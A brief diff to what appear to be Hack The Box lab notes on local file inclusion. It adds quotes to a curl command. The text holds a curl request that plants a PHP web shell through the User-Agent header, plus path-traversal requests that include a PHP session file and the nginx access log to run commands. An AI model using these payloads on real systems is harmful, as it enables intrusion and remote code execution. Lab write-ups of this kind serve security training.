@@ -38,7 +38,7 @@ http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o
 ```
 ```
 [/htb]$ curl -s "http://<SERVER_IP>:<PORT>/index.php" -A "<?php system($_GET['cmd']); ?>"
-[/htb]$ curl -s http://83.136.252.44:46301/ilf_admin/index.php?log=../../../../../../../../../../../../../var/log/nginx/access.log&cmd=id
+[/htb]$ curl -s "http://83.136.252.44:46301/ilf_admin/index.php?log=../../../../../../../../../../../../../var/log/nginx/access.log&cmd=id"
 ```
 # Useful Payloads
 ```php
